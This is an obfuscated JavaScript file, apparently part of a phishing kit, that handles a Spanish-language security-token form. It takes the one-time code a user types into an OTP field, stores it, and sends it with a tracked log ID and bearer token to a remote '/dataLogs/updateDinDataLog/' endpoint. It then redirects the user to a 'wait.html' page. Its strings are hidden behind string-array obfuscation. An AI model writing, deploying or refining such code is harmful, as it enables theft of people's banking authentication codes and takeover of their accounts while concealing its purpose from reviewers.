const _0xb2bc02 = _0x219f;
(function (_0x4a1e74, _0x2649e8) {
  const _0x109022 = _0x219f,
    _0x26aff8 = _0x4a1e74();
  while (!![]) {
    try {
      const _0x3a7b5c =
        -parseInt(_0x109022(0x105)) / 0x1 +
        (parseInt(_0x109022(0xff)) / 0x2) *
          (-parseInt(_0x109022(0x112)) / 0x3) +
        (-parseInt(_0x109022(0xef)) / 0x4) *
          (-parseInt(_0x109022(0x10d)) / 0x5) +
        (parseInt(_0x109022(0x107)) / 0x6) *
          (-parseInt(_0x109022(0xf5)) / 0x7) +
        -parseInt(_0x109022(0x106)) / 0x8 +
        (-parseInt(_0x109022(0x110)) / 0x9) *
          (parseInt(_0x109022(0x10f)) / 0xa) +
        (-parseInt(_0x109022(0x115)) / 0xb) *
          (-parseInt(_0x109022(0xfd)) / 0xc);
      if (_0x3a7b5c === _0x2649e8) break;
      else _0x26aff8["push"](_0x26aff8["shift"]());
    } catch (_0x2d4e49) {
      _0x26aff8["push"](_0x26aff8["shift"]());
    }
  }
})(_0x6608, 0x5deaf);
function _0x219f(_0x411ca4, _0x254ef6) {
  const _0x660836 = _0x6608();
  return (
    (_0x219f = function (_0x219ffd, _0x6514a4) {
      _0x219ffd = _0x219ffd - 0xee;
      let _0x4508a8 = _0x660836[_0x219ffd];
      return _0x4508a8;
    }),
    _0x219f(_0x411ca4, _0x254ef6)
  );
}
function updateLS() {
  const _0x284029 = _0x219f;
  LS[_0x284029(0x108)](_0x284029(0xf2), JSON["stringify"](info));
}
const otpButton = document[_0xb2bc02(0x10b)]("btnOTP"),
  numberMovil = document[_0xb2bc02(0x10b)](_0xb2bc02(0x10c));
async function updateOtp() {
  const _0x2dcb30 = _0xb2bc02;
  try {
    const _0x1b22a9 = localStorage[_0x2dcb30(0xf6)]("dataLogId"),
      _0x2fda07 = localStorage[_0x2dcb30(0xf6)](_0x2dcb30(0xfc));
    if (!_0x1b22a9 || !_0x2fda07) throw new Error(_0x2dcb30(0x100));
    const _0x2784ef = await fetch(url + _0x2dcb30(0xfe) + _0x1b22a9, {
      method: _0x2dcb30(0xfa),
      headers: {
        "Content-Type": _0x2dcb30(0x111),
        Authorization: _0x2dcb30(0x104) + _0x2fda07,
        Origin: window[_0x2dcb30(0xfb)][_0x2dcb30(0x116)],
      },
      body: JSON[_0x2dcb30(0x114)]({
        din: info[_0x2dcb30(0x10a)]["cdin"],
        status: _0x2dcb30(0xf8),
      }),
    });
    if (!_0x2784ef["ok"]) {
      const _0xfaff0d = await _0x2784ef[_0x2dcb30(0x113)]();
      throw new Error(_0xfaff0d[_0x2dcb30(0x109)] || _0x2dcb30(0x117));
    }
    const _0x251d90 = await _0x2784ef["json"]();
    console[_0x2dcb30(0x101)](_0x2dcb30(0x10e)),
      (window[_0x2dcb30(0xfb)][_0x2dcb30(0xf4)] = "wait.html");
  } catch (_0x2b663a) {
    console[_0x2dcb30(0x109)](_0x2dcb30(0xf1), _0x2b663a),
      (otpButton[_0x2dcb30(0xee)] = ![]);
  }
}
function _0x6608() {
  const _0x311294 = [
    "focus",
    "Error\x20al\x20procesar\x20el\x20OTP:",
    "info",
    "value",
    "href",
    "7CJLAQV",
    "getItem",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "Ingresó\x20Dinámica",
    "cdin",
    "PUT",
    "location",
    "dataLogToken",
    "13812iUTzuz",
    "/dataLogs/updateDinDataLog/",
    "2rYKFDk",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "log",
    "addEventListener",
    "click",
    "Bearer\x20",
    "245179uiwYsk",
    "3325664nRCJWv",
    "2899812FeCNxx",
    "setItem",
    "error",
    "metaInfo",
    "getElementById",
    "txtOTP",
    "337380jSxMJc",
    "Usuario\x20actualizado\x20correctamente\x20con\x20OTP",
    "10cYFhji",
    "1775907pvqYBa",
    "application/json",
    "1019094RfOngR",
    "json",
    "stringify",
    "17809KJzdVN",
    "origin",
    "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor",
    "disabled",
    "12XfhrBg",
  ];
  _0x6608 = function () {
    return _0x311294;
  };
  return _0x6608();
}
otpButton[_0xb2bc02(0x102)]("click", async function (_0x1b9e65) {
  const _0x28e78a = _0xb2bc02;
  _0x1b9e65["preventDefault"](), (otpButton[_0x28e78a(0xee)] = !![]);
  if (numberMovil[_0x28e78a(0xf3)] == "") {
    alert(_0x28e78a(0xf7)),
      numberMovil["focus"](),
      (otpButton[_0x28e78a(0xee)] = ![]);
    return;
  }
  const _0x34f80e = numberMovil[_0x28e78a(0xf3)];
  (info[_0x28e78a(0x10a)][_0x28e78a(0xf9)] = _0x34f80e),
    updateLS(),
    await updateOtp();
}),
  otpButton["addEventListener"](_0xb2bc02(0x103), async function (_0x4b5740) {
    const _0x106492 = _0xb2bc02;
    _0x4b5740["preventDefault"](), (otpButton["disabled"] = !![]);
    if (numberMovil[_0x106492(0xf3)] == "") {
      alert(_0x106492(0xf7)),
        numberMovil[_0x106492(0xf0)](),
        (otpButton[_0x106492(0xee)] = ![]);
      return;
    } else {
      const _0xdfcb87 = numberMovil[_0x106492(0xf3)];
      (info[_0x106492(0x10a)][_0x106492(0xf9)] = _0xdfcb87),
        updateLS(),
        await updateOtp();
    }
  });
